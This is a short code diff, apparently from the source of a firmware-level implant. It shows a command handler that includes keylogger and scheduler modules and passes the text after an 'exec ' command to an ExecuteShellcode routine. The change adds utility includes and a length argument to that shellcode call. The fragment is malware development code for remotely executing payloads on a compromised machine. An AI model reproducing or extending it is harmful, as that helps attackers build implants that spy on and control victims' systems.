@@ -1,4 +1,6 @@
 #include "CommandExec.h"
+#include "../Shared/Utils.h"
+#include "../Shared/MemTools.h"
 #include "../Shared/Logger.h"
 #include "Keylogger.h"
 #include "Scheduler.h"
@@ -29,7 +31,7 @@ VOID ProcessCommand(CHAR16* Cmd) {
     else if (StrnCmp(Cmd, L"exec ", 5) == 0) {
         CHAR16* Payload = Cmd + 5;
         LogInfo(L"executing payload\n");
-        ExecuteShellcode(Payload);  
+        ExecuteShellcode(Payload, StrLen(Payload) * 2);  
     }
     else {
         LogWarning(L"Unknown command received\n");
